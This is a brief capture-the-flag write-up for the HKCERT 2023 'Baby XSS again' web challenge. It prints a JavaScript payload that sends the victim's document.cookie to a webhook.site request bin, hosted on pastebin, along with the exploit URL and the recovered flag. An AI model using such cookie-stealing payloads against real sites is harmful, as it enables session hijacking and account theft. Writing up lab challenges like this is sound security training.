We are provided with some very nice steps in the step-by-step:
https://hackmd.io/@blackb6a/hkcert-ctf-2023-ii-en-4e6150a89a1ff32c#%E5%8F%88%E6%9C%89%E5%AF%B6%E8%B2%9D-XSS--Baby-XSS-again-Web

Less work for me I guess!

First we make a request bin:

```
location='https://webhook.site/e307542f-7ce6-4578-9f74-69957b31a2c4/?cookie='+document.cookie
```

Upload to pastebin, do captcha, done.

http://babyxss-k7ltgk.hkcert23.pwnable.hk:28232/?src=https://pastebin.com/dl/tVWDNAEH


flag=hkcert23{pastebin_0r_trashbin}